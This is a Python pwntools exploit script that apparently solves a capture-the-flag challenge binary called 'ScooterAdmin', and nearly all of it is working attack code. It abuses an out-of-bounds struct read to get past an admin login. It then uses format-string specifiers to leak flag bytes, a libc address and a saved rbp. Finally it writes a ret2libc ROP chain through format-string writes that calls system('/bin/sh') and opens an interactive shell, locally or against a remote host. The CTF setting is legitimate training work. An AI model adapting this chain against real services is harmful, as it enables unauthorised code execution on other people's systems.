#!/usr/bin/env python3


"""
First atack is simply a read into a struct with incorrect bounds.
Second is format specifier leaking.
Third is ret2libc with format specifier write to rbp.
"""

from pwn import *


exe = ELF("./ScooterAdmin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       b *fetchfile+241
                       c
        ''')

    return r


def main():
    r = conn()

    def send_payload(payload):
        r.recvuntil(b'Enter choice:')
        r.sendline(b'3')
        r.sendline(payload)
        r.recvuntil(b'for:')
        return r.recvline()

    context.update(arch = 'amd64', os = 'linux')

    log.progress("Exploiting 🔥") 
    log.progress("Crafting first payload 🍺 ")
    payload = b'\x41\r\n'
    payload += b'\x42'*29
    payload += b'\x00\x00\x00\x00'
    payload += b'\x00'*14

    log.progress("Sending first payload 💣")
    r.send(payload)

    log.progress("Crafting second payload 🍺 ")
    payload = b'\x41\x00'

    log.progress("Sending second payload 💣")
    r.sendline(payload)

    r.recvuntil(b'Welcome Admin.\n\n')
    flag1 = r.recvuntil(b'}').decode('utf-8')
    log.progress("🏳️  flag 1: ", flag1)

    log.progress("Sending third payload 💣")
    # to process the hexadecimal values flag into a readable string
    preflag = send_payload(b'%2094$p %2095$p %2096$p %2097$p %2098$p').decode("utf-8").split("\n")[0].split(" ")[1:]
     
    log.progress("Crafting second flag from response 🍺 ")
    flag2 = ""
    for hexdec in preflag:
        # convert hexadecimal values to chars
        subflag = p64(int(hexdec, base=16)).decode("utf-8")
        flag2 += subflag
    flag2 = flag2.split('\n')[0]

    log.progress("🏳️  flag 2: ", flag2)

    log.progress("Leaking libc 🚰")
    leak = int(send_payload(b'%3$p').decode("utf-8").split("\n")[0], 16)
    libc.address = leak - libc.sym['write'] - 0x17
    log.progress("Libc leak: ", hex(libc.address))

    # This is rbp of the mainloop function
    # For some reason the fetchfile function rbp wasn't working remotely
    log.progress("Leaking rbp 🚰")
    rbp = int(send_payload(b'%2056$p').decode("utf-8").split("\n")[0], 16)
    log.progress("rbp address: ", hex(rbp))

    log.progress("Building format string object 👷")
    format_string = FmtStr(execute_fmt=send_payload)

    rop = ROP(libc)
    log.progress("Finding gadgets 🔍")
    pop_rdi = rop.rdi.address
    system = libc.sym['system']
    log.progress("Libc system: ", hex(system))
    binsh = next(libc.search(b'/bin/sh'))
    log.progress("Libc binsh: ", hex(binsh))
    ret = rop.ret.address

    log.progress("Building second rop chain 👷")
    format_string.write(rbp, ret)
    format_string.write(rbp+8, pop_rdi)
    format_string.write(rbp+16, binsh)
    format_string.write(rbp+24, ret)
    format_string.write(rbp+32, system)
    format_string.execute_writes()


    log.success("Popping shell 💥")
    r.recvuntil(b'Enter choice:')
    r.sendline(b'5')
    r.interactive()


if __name__ == "__main__":
    main()

